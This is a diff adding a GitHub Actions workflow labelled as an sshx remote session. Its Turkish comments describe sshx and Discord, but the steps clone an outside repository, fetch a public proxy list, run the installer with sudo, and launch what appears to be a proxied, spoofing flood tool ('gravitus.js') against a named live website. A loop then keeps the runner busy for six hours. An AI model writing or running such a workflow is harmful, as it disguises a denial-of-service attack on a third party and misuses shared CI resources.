@@ -1,0 +1,33 @@
+name: SSHX Remote Session
+
+on:
+  workflow_dispatch: # Manuel olarak tetiklemek için
+
+jobs:
+  ssh-session:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 360 # GitHub Actions'ın maksimum limitidir (6 saat)
+
+    steps:
+      - name: Start sshx and notify Discord
+        env:
+          DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
+        run: |
+          # 1. sshx kurulumunu yapıp arka planda çalıştırıyoruz ve çıktıyı dosyaya yazıyoruz
+          git clone https://github.com/iamthebestm85/Gravitus
+          
+          # 2. Çıktının oluşması için kısa bir süre bekliyoruz
+           cd Gravitus
+          wget -O proxy.txt "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=100&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
+          
+          # 3. Log dosyasından sshx linkini ayıklıyoruz
+          sudo python3 install.py  
+          
+          node gravitus.js https://woldan.cc 60000 16 32 proxy.txt --bfm --spoof --cache --ratelimit
+               
+          # 5. Kapanmayı önlemek için her 5 dakikada bir çıktı veren sonsuz döngü
+          echo "Sonsuz döngü başlatılıyor..."
+          while true; do
+            echo "Makine aktif tutuluyor: $(date)"
+            sleep 300
+          done
